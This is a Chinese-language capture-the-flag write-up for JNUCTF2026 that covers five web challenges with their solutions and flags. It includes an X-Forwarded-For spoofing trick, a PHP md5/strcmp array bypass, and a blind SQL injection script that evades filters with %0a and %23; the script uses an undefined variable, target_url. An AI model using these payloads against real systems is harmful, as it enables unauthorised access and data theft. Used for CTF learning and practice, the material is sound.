# [个人队伍] JNUCTF2026的Writeup

> **2026年3月29日9:00 ~ 2026年3月29日12:00**
>
> **比赛地址：http://awd.towere.com.cn/challenges**
>
> **复现地址：http://awd.towere.com.cn/challenges**

> [![ 一流网络安全学院建设：Web安全挑战赛](http://awd.towere.com.cn/files/932b1070a8227d7e3d9a7ca755c86e98/logo.png)**一流网络安全学院建设：Web安全挑战赛**](http://awd.towere.com.cn/)
>
> - 
> -  probie 
> -  ZH_CN 
> - 
>
> ![首页长图](http://awd.towere.com.cn/themes/wmctf2025/static/img/bg.jpg)
>
> [广州塔易信息技术有限公司](https://towere.com.cn/html/index/index.html)
>
> JNUCTF[暨南大学网络空间安全学院](https://cybsec.jnu.edu.cn/)



# Web

## 你只能用本地地址和我联系哦～

### 题目信息

> ## 你只能用本地地址和我联系哦～
>
> ### 50
>
> 
>
> 挑战题目地址： http://139.199.162.176/Access_local/

### 解题过程

```shell
http://139.199.162.176/Access_local/
X-Forwarded-For 127.0.0.1
```

```shell
flag is flag{93959eeb927ea3fbbb6e52d50e5cd552}
```

### 题目答案

**得到：flag{93959eeb927ea3fbbb6e52d50e5cd552}**



## 签到题～

### 题目信息

> ## 签到题～
>
> ### 100
>
> 
>
> Let's start the Web_Security_Challenge!
>
> 挑战题目地址： http://106.55.228.147:18089/ 或 http://118.126.103.13:18089/ 任意选择其中一个地址

### 解题过程

**查看源码**

```html
<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Web10 Check-in Desk</title>
  <link rel="icon" href="/favicon.ico" sizes="any">
  <link rel="stylesheet" href="/static/style.css">
</head>
<body class="checkin-home">
  <!-- hint: /checkin?token=get-flag -->
  <main class="hero-background" aria-hidden="true">
    <img class="hero-image" src="/static/home-bg.jpg" alt="">
  </main>
</body>
</html>
```

### 题目答案

```shell
http://106.55.228.147:18089/checkin?token=get-flag
```

```shell
flag{9ace800166c81178d791806b57c832b4}
```

**得到：flag{9ace800166c81178d791806b57c832b4}**



## 为你写诗

### 题目信息

> ## 为你写诗
>
> ### 50
>
> 
>
> 挑战题目地址：
>
> http://139.199.162.176/Code_Php/

### 解题过程

**查看源码**

```shell
<!--<a class="link" href="code.txt" target="_blank">链接</a>-->
```

```php
<?php

if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```

**分析**

- 数组绕过

### 题目答案

```shell
http://139.199.162.176/Code_Php/?v1[]=1&v2[]=2&v3[]=3
```

```shell
flag{f87ed55a5661b4c67c7447cedb2cdfed}
```

**得到：flag{f87ed55a5661b4c67c7447cedb2cdfed}**



## Sensitive_information_leakage

### 题目信息

> ## Sensitive_information_leakage
>
> ### 50
>
> 
>
> http://139.199.162.176/Sensitive_information_leakage/

### 解题过程

**查看源码**

```shell
<font size="10">签到喽～，你不应该做点什么吗?</font><!--index.php.txt--></html>
```

```php
<?php
include 'flag.php';
if (isset($_GET['name']))
{   
    if ($_GET['name']==='GDJNU_TOWERE_3_CTF') 
        die('Flag: '.$flag);   
    else   
        print 'name is not true!!!';   
}
else
{
    echo '<font size="10">绛惧埌鍠斤綖锛屼綘涓嶅簲璇ュ仛鐐逛粈涔堝悧?</font><!--index.php.txt-->';
}   
?>
```

### 题目答案

```shell
http://139.199.162.176/Sensitive_information_leakage/?name=GDJNU_TOWERE_3_CTF
```

```shell
Flag: flag{8b6b5b99393dfb93396522ba51bcb183}
```

**得到：flag{8b6b5b99393dfb93396522ba51bcb183}**



## ez_sqli

### 题目信息

> 题目信息

### 解题过程

**测试漏洞**

```shell
1 or true --+
```

```shell
过滤
```

**分析**

- 需要绕过`+`和`[空格]`
- 用`#`替代`--+`，用`%0a`代替`%20`

### 题目答案

**sql盲注**

```python
import requests

url = "http://106.55.172.76/index.php"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-"
flag = ""

for i in range(1, 50):
    found = False
    for char in charset:
        payload = f"id=1%0aand%0a(substring((select%0aflag%0afrom%0aflag),{i},1))%0a=%0a'{char}'%23"
        response = requests.get(target_url + "?" + payload)
        if "admin" in response.text:
            flag += char
            print(f"{char}")
            found = True
            break
    if not found:
        break

print(f"{flag}")
```

```shell
flag{21232f297a57a5a743894a0e4a801fc3}
```

**得到：flag{21232f297a57a5a743894a0e4a801fc3}**



# 队伍

## 名称

**probie**



## 口号

**暂无**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**